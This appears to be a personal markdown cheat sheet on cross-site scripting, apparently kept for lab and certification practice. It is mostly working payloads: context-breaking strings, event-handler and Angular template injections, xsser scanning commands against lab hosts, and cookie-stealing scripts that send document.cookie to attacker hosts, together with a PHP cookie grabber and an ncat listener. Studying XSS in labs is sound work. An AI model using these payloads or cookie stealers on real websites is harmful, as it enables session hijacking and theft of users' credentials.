



# Tricks

```js
//start with
';"/> /* 
';"/></script>
'"/></textarea></script>
';"/></textarea></script>
"><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
```
```javascript 
<script>var i = new Image(); i.src="http://attacker.site/get.php?cookie="+escape(document.cookie);</script>
```


## run JS in href tag

```js
javascript:alert(8007)
```

## XSS in HTML tag attributes
>if tags '<>'  are banned


```js
" autofocus onfocus=alert(document.domain) x="
```
# DOM XSS


## jQuery


### attr()
>jQuery's `attr()` function can change the attributes of DOM elements.
>


```js
javascript:alert(document.domain)
```
### hashchange event

```html
<iframe src="https://0a7500ce041a656384bdc84700240091.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print()>'">
```
# Angular xss

```js
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```



# xsser 

## check for xss

```bash
xsser --url 'URL' -p 'Injectable url: add XSS to the pramater value '

e.g.


xsser --url 'http://demo.ine.local/index.php?page=dns-lookup.php' -p 'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'

# Other options

--auto # various XSS payloads

--Fp "<script>alert(1)</script>" # Using custom XSS payload



# xsser check for xss over GET request

xxser --url 'http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=nmap&initials=&user-poll-php-submit-button=Submit+Vote'


# Custom payload for GET request


xsser --url "http://demo.ine.local/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=d&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"
```


# Cheat sheet

Stealing cookie script with ncat listener

```
nc -lvnkp 9999
```

```
<script>
var xhr = new XMLHttpRequest(); 
xhr.open('GET', 'http://attacker-site.com/?cookie=' + document.cookie, true);
xhr.send();
</script>
```

```
# Create grabber.php 
cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF

# XSS script

<script>document.location='http://10.8.50.72:8000/grabber.php?c='+document.cookie</script>
```



---
Tags: #XSS
Resources:  
[PortSwigger DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
[DOMXSS WIKI](https://github.com/wisec/domxsswiki/wiki)
[Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected)
[PortSwigget XSS context](https://portswigger.net/web-security/cross-site-scripting/contexts)